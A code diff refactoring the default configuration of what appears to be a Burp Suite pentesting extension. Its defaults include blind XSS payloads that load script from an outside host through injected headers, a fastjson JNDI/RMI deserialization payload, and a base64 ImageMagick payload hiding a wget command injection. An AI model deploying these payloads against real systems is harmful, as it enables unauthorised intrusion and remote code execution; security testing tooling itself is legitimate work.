@@ -1,5 +1,6 @@
 package config;
 
+import java.awt.Container;
 import java.io.File;
 import java.io.PrintWriter;
 import java.util.ArrayList;
@@ -39,60 +40,70 @@ public class ConfigTableModel extends AbstractTableModel{
 			+ "--max-rtt-timeout 1000ms --max-retries 0 --max-scan-delay 0 --min-rate 3000 {Host}";
 
 	private static final String Robot_Input_Comment = "this config effects how sqlmap and nmap runs";
-
-	public ConfigTableModel(){
-
-		configEntries.add(new ConfigEntry("Put_MenuItems_In_One_Menu", "",ConfigEntry.Config_Basic_Variable,false,false));
-		configEntries.add(new ConfigEntry("DNSlogServer", "bit.0y0.link",ConfigEntry.Config_Basic_Variable,true,false));
+	
+	public static String genDnslogPayload() {
+		String fullPayload = BurpExtender.DNSlogClient.generatePayload(false)+"."+BurpExtender.DNSlogClient.getCollaboratorServerLocation();
+		return fullPayload;
+	}
+	
+	public static List<ConfigEntry> initDefaultConfigs() {
+		List<ConfigEntry> defaultConfigEntries = new ArrayList<>();
+		defaultConfigEntries.add(new ConfigEntry("Put_MenuItems_In_One_Menu", "",ConfigEntry.Config_Basic_Variable,false,false));
+		defaultConfigEntries.add(new ConfigEntry("DNSlogServer", genDnslogPayload(),ConfigEntry.Config_Basic_Variable,true,false));
 		if (SystemUtils.isMac()) {
-			configEntries.add(new ConfigEntry("browserPath", Firefox_Mac,ConfigEntry.Config_Basic_Variable,true,false));
+			defaultConfigEntries.add(new ConfigEntry("browserPath", Firefox_Mac,ConfigEntry.Config_Basic_Variable,true,false));
 		}else {
 			if (new File(Firefox_Windows_C).exists()){
-				configEntries.add(new ConfigEntry("browserPath", Firefox_Windows_C,ConfigEntry.Config_Basic_Variable,true,false));
+				defaultConfigEntries.add(new ConfigEntry("browserPath", Firefox_Windows_C,ConfigEntry.Config_Basic_Variable,true,false));
 			}else {
-				configEntries.add(new ConfigEntry("browserPath", Firefox_Windows_D,ConfigEntry.Config_Basic_Variable,true,false));
+				defaultConfigEntries.add(new ConfigEntry("browserPath", Firefox_Windows_D,ConfigEntry.Config_Basic_Variable,true,false));
 			}
 		}
-		configEntries.add(new ConfigEntry("tokenHeaders", "token,Authorization,Auth,jwt",ConfigEntry.Config_Basic_Variable,true,false));
-		//configEntries.add(new ConfigEntry("DismissedTargets", "{\"*.firefox.com\":\"Drop\",\"*.mozilla.com\":\"Drop\"}",ConfigEntry.Config_Basic_Variable,true,false));
-		//configEntries.add(new ConfigEntry("DismissedAutoForward", "*.firefox.com,*.mozilla.com",ConfigEntry.Config_Basic_Variable,true,false));
-		//configEntries.add(new ConfigEntry("DismissedHost", "*.firefox.com,*.mozilla.com",ConfigEntry.Config_Basic_Variable,true,false));
-		//configEntries.add(new ConfigEntry("DismissedURL", "",ConfigEntry.Config_Basic_Variable,true,false));
-		//configEntries.add(new ConfigEntry("DismissAction", "enable = ACTION_DROP; disable = ACTION_DONT_INTERCEPT",ConfigEntry.Config_Basic_Variable,true,false,"enable this config to use ACTION_DROP,disable to use ACTION_DONT_INTERCEPT"));
-		configEntries.add(new ConfigEntry("XSS-Payload", "'\\\"><sCRiPt/src=//bmw.xss.ht>",ConfigEntry.Config_Basic_Variable,true,false));
+		defaultConfigEntries.add(new ConfigEntry("tokenHeaders", "token,Authorization,Auth,jwt",ConfigEntry.Config_Basic_Variable,true,false));
+		//defaultConfigEntries.add(new ConfigEntry("DismissedTargets", "{\"*.firefox.com\":\"Drop\",\"*.mozilla.com\":\"Drop\"}",ConfigEntry.Config_Basic_Variable,true,false));
+		//defaultConfigEntries.add(new ConfigEntry("DismissedAutoForward", "*.firefox.com,*.mozilla.com",ConfigEntry.Config_Basic_Variable,true,false));
+		//defaultConfigEntries.add(new ConfigEntry("DismissedHost", "*.firefox.com,*.mozilla.com",ConfigEntry.Config_Basic_Variable,true,false));
+		//defaultConfigEntries.add(new ConfigEntry("DismissedURL", "",ConfigEntry.Config_Basic_Variable,true,false));
+		//defaultConfigEntries.add(new ConfigEntry("DismissAction", "enable = ACTION_DROP; disable = ACTION_DONT_INTERCEPT",ConfigEntry.Config_Basic_Variable,true,false,"enable this config to use ACTION_DROP,disable to use ACTION_DONT_INTERCEPT"));
+		defaultConfigEntries.add(new ConfigEntry("XSS-Payload", "'\\\"><sCRiPt/src=//bmw.xss.ht>",ConfigEntry.Config_Basic_Variable,true,false));
 
-		configEntries.add(new ConfigEntry("SQLMap-Command",SQLMap_Command,ConfigEntry.Run_External_Cmd,true,true));
-		configEntries.add(new ConfigEntry("Nmap-Command",Nmap_Command,ConfigEntry.Run_External_Cmd,true,false));
-		configEntries.add(new ConfigEntry("RunTerminalWithRobotInput","",ConfigEntry.Config_Basic_Variable,false,false,Robot_Input_Comment));
-		configEntries.add(new ConfigEntry("RunTerminalWithKonsole","",ConfigEntry.Config_Basic_Variable,false,false,"判断是否为konsole终端"));
+		defaultConfigEntries.add(new ConfigEntry("SQLMap-Command",SQLMap_Command,ConfigEntry.Run_External_Cmd,true,true));
+		defaultConfigEntries.add(new ConfigEntry("Nmap-Command",Nmap_Command,ConfigEntry.Run_External_Cmd,true,false));
+		defaultConfigEntries.add(new ConfigEntry("RunTerminalWithRobotInput","",ConfigEntry.Config_Basic_Variable,false,false,Robot_Input_Comment));
+		defaultConfigEntries.add(new ConfigEntry("RunTerminalWithKonsole","",ConfigEntry.Config_Basic_Variable,false,false,"判断是否为konsole终端"));
 		//Mac中，通过脚本执行的也会有命令历史记录，使用这种方式最好
 
-		configEntries.add(new ConfigEntry("Chunked-Length", "10",ConfigEntry.Config_Chunked_Variable,true,false));
-		configEntries.add(new ConfigEntry("Chunked-AutoEnable", "",ConfigEntry.Config_Chunked_Variable,false,false));
-		configEntries.add(new ConfigEntry("Chunked-UseComment", "",ConfigEntry.Config_Chunked_Variable,true,false));
+		defaultConfigEntries.add(new ConfigEntry("Chunked-Length", "10",ConfigEntry.Config_Chunked_Variable,true,false));
+		defaultConfigEntries.add(new ConfigEntry("Chunked-AutoEnable", "",ConfigEntry.Config_Chunked_Variable,false,false));
+		defaultConfigEntries.add(new ConfigEntry("Chunked-UseComment", "",ConfigEntry.Config_Chunked_Variable,true,false));
 
-		//configEntries.add(new ConfigEntry("Proxy-ServerList", "127.0.0.1:8888;127.0.0.1:9999;",ConfigEntry.Config_Proxy_Variable,false,false));
-		//configEntries.add(new ConfigEntry("Proxy-UseRandomMode", "",ConfigEntry.Config_Proxy_Variable,true,false));
+		//defaultConfigEntries.add(new ConfigEntry("Proxy-ServerList", "127.0.0.1:8888;127.0.0.1:9999;",ConfigEntry.Config_Proxy_Variable,false,false));
+		//defaultConfigEntries.add(new ConfigEntry("Proxy-UseRandomMode", "",ConfigEntry.Config_Proxy_Variable,true,false));
 		//以上都是固定基础变量，不需要修改名称和类型
 
-		configEntries.add(new ConfigEntry("Last-Modified", "",ConfigEntry.Action_Remove_From_Headers,true,true));
-		configEntries.add(new ConfigEntry("If-Modified-Since", "",ConfigEntry.Action_Remove_From_Headers,true,true));
-		configEntries.add(new ConfigEntry("If-None-Match", "",ConfigEntry.Action_Remove_From_Headers,true,true));
-		configEntries.add(new ConfigEntry("OPTIONS", "",ConfigEntry.Action_Forward_And_Hide_Options,true,true));
+		defaultConfigEntries.add(new ConfigEntry("Last-Modified", "",ConfigEntry.Action_Remove_From_Headers,true,true));
+		defaultConfigEntries.add(new ConfigEntry("If-Modified-Since", "",ConfigEntry.Action_Remove_From_Headers,true,true));
+		defaultConfigEntries.add(new ConfigEntry("If-None-Match", "",ConfigEntry.Action_Remove_From_Headers,true,true));
+		defaultConfigEntries.add(new ConfigEntry("OPTIONS", "",ConfigEntry.Action_Forward_And_Hide_Options,true,true));
 
-		configEntries.add(new ConfigEntry("X-Forwarded-For", "'\\\"><sCRiPt/src=//bmw.xss.ht>",ConfigEntry.Action_Add_Or_Replace_Header,true,true));
+		defaultConfigEntries.add(new ConfigEntry("X-Forwarded-For", "'\\\"><sCRiPt/src=//bmw.xss.ht>",ConfigEntry.Action_Add_Or_Replace_Header,true,true));
 		//避免IP:port的切分操作，把Payload破坏，所以使用不带分号的简洁Payload
-		configEntries.add(new ConfigEntry("User-Agent", "'\\\"/><script src=https://bmw.xss.ht></script><img/src={dnslogserver}/{host}>",ConfigEntry.Action_Append_To_header_value,true,true));
-		//configEntries.add(new ConfigEntry("knife", "'\\\"/><script src=https://bmw.xss.ht></script><img/src=%dnslogserver/%host>",ConfigEntry.Action_Add_Or_Replace_Header,true));
+		defaultConfigEntries.add(new ConfigEntry("User-Agent", "'\\\"/><script src=https://bmw.xss.ht></script><img/src={dnslogserver}/{host}>",ConfigEntry.Action_Append_To_header_value,true,true));
+		//defaultConfigEntries.add(new ConfigEntry("knife", "'\\\"/><script src=https://bmw.xss.ht></script><img/src=%dnslogserver/%host>",ConfigEntry.Action_Add_Or_Replace_Header,true));
 
-		configEntries.add(new ConfigEntry("fastjson", "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://{host}.fastjson.{dnslogserver}/evil\",\"autoCommit\":true}",ConfigEntry.Config_Custom_Payload,true));
+		defaultConfigEntries.add(new ConfigEntry("fastjson", "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://{host}.fastjson.{dnslogserver}/evil\",\"autoCommit\":true}",ConfigEntry.Config_Custom_Payload,true));
 
-		configEntries.add(new ConfigEntry("Imagemagick","cHVzaCBncmFwaGljLWNvbnRleHQNCnZpZXdib3ggMCAwIDY0MCA0ODANCmltYWdlIG92ZXIgMCwwIDAsMCAnaHR0cHM6Ly9pbWFnZW1hZ2ljLmJpdC4weTAubGluay94LnBocD94PWB3Z2V0IC1PLSAlcyA+IC9kZXYvbnVsbGAnDQpwb3AgZ3JhcGhpYy1jb250ZXh0",ConfigEntry.Config_Custom_Payload_Base64,true));
+		defaultConfigEntries.add(new ConfigEntry("Imagemagick","cHVzaCBncmFwaGljLWNvbnRleHQNCnZpZXdib3ggMCAwIDY0MCA0ODANCmltYWdlIG92ZXIgMCwwIDAsMCAnaHR0cHM6Ly9pbWFnZW1hZ2ljLmJpdC4weTAubGluay94LnBocD94PWB3Z2V0IC1PLSAlcyA+IC9kZXYvbnVsbGAnDQpwb3AgZ3JhcGhpYy1jb250ZXh0",ConfigEntry.Config_Custom_Payload_Base64,true));
 
-		configEntries.add(new ConfigEntry("*.firefox.com", "",ConfigEntry.Action_Drop_Request_If_Host_Matches,true));
-		configEntries.add(new ConfigEntry("*.mozilla.com", "",ConfigEntry.Action_Drop_Request_If_Host_Matches,true));
-		configEntries.add(new ConfigEntry("*.mozilla.org", "",ConfigEntry.Action_Drop_Request_If_Host_Matches,true));
-		configEntries.add(new ConfigEntry("*.mozilla.net", "",ConfigEntry.Action_Drop_Request_If_Host_Matches,true));
+		defaultConfigEntries.add(new ConfigEntry("*.firefox.com", "",ConfigEntry.Action_Drop_Request_If_Host_Matches,true));
+		defaultConfigEntries.add(new ConfigEntry("*.mozilla.com", "",ConfigEntry.Action_Drop_Request_If_Host_Matches,true));
+		defaultConfigEntries.add(new ConfigEntry("*.mozilla.org", "",ConfigEntry.Action_Drop_Request_If_Host_Matches,true));
+		defaultConfigEntries.add(new ConfigEntry("*.mozilla.net", "",ConfigEntry.Action_Drop_Request_If_Host_Matches,true));
+		return defaultConfigEntries;
+	}
+	
+	public ConfigTableModel(){
+		configEntries = initDefaultConfigs();
 	}
 
 	public void addListener() {
